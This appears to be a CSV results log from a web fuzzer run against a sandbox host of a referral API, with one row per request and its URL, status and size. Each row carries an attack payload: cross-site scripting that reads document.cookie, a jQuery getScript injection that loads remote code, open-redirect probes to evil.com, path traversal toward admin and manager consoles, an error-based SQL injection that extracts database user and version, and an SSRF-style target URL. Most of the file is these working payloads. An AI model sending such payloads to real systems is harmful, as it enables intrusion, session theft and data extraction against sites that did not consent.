FUZZ,url,redirectlocation,position,status_code,content_length,content_words,content_lines,content_type,duration,resultfile
?mobile=1&mp_idx=%22;$.getScript(%27//127.0.0.1/z%27);/,https://referralapi-referral.sbox.officevibe.com/?mobile=1&mp_idx=%22;$.getScript(%27//127.0.0.1/z%27);/,,20499,200,3633,1866,43,text/plain; charset=utf-8,50.497457ms,
.,https://referralapi-referral.sbox.officevibe.com/.,,59964,200,3633,1866,43,text/plain; charset=utf-8,48.755407ms,
?mod=<script>alert(document.cookie)</script>&op=browse,https://referralapi-referral.sbox.officevibe.com/?mod=<script>alert(document.cookie)</script>&op=browse,,87084,200,3633,1866,43,text/plain; charset=utf-8,32.965798ms,
//evil.com/%2F..,https://referralapi-referral.sbox.officevibe.com///evil.com/%2F..,,106852,200,3633,1866,43,text/plain; charset=utf-8,67.048999ms,
"%0a%0a<script>alert(\""Vulnerable\"")</script>.jsp","https://referralapi-referral.sbox.officevibe.com/%0a%0a<script>alert(\""Vulnerable\"")</script>.jsp",,112124,200,3633,1866,43,text/plain; charset=utf-8,35.868512ms,
#/../admin,https://referralapi-referral.sbox.officevibe.com/#/../admin,,113455,200,3633,1866,43,text/plain; charset=utf-8,32.296961ms,
#/../console,https://referralapi-referral.sbox.officevibe.com/#/../console,,162227,200,3633,1866,43,text/plain; charset=utf-8,46.998218ms,
#/../manager/text,https://referralapi-referral.sbox.officevibe.com/#/../manager/text,,168130,200,3633,1866,43,text/plain; charset=utf-8,70.554422ms,
?objGroupID=%31%32%27%7c%7c%28SeleCT%20%27Efe%27%20FroM%20duAL%20WheRE%20110=110%20AnD%20%28seLEcT%20112%20frOM(SElecT%20CouNT(*)%2cConCAT%28CONcat(0x203a20%2cUseR()%2cDAtaBASe()%2cVErsION())%2c(SeLEct%20%28ELT(112=112%2c1%29%29%29%2cFLooR(RAnd(0)*2))x%20FROM%20INFOrmatION_SchEMA.PluGINS%20grOUp%20BY%20x%29a%29%29%7c%7c%27,https://referralapi-referral.sbox.officevibe.com/?objGroupID=%31%32%27%7c%7c%28SeleCT%20%27Efe%27%20FroM%20duAL%20WheRE%20110=110%20AnD%20%28seLEcT%20112%20frOM(SElecT%20CouNT(*)%2cConCAT%28CONcat(0x203a20%2cUseR()%2cDAtaBASe()%2cVErsION())%2c(SeLEct%20%28ELT(112=112%2c1%29%29%29%2cFLooR(RAnd(0)*2))x%20FROM%20INFOrmatION_SchEMA.PluGINS%20grOUp%20BY%20x%29a%29%29%7c%7c%27,,177755,200,3633,1866,43,text/plain; charset=utf-8,41.465618ms,
?targetURL=https://www.owler.com/iaApp/getDataCard.htm,https://referralapi-referral.sbox.officevibe.com/?targetURL=https://www.owler.com/iaApp/getDataCard.htm,,190572,200,3633,1866,43,text/plain; charset=utf-8,125.740467ms,
#/../html,https://referralapi-referral.sbox.officevibe.com/#/../html,,198439,200,3633,1866,43,text/plain; charset=utf-8,41.127334ms,
#/../www,https://referralapi-referral.sbox.officevibe.com/#/../www,,203527,200,3633,1866,43,text/plain; charset=utf-8,48.705481ms,
#/../manager/html,https://referralapi-referral.sbox.officevibe.com/#/../manager/html,,205028,200,3633,1866,43,text/plain; charset=utf-8,33.525556ms,
/evil.com/%2F..,https://referralapi-referral.sbox.officevibe.com//evil.com/%2F..,,272876,200,3633,1866,43,text/plain; charset=utf-8,45.722135ms,
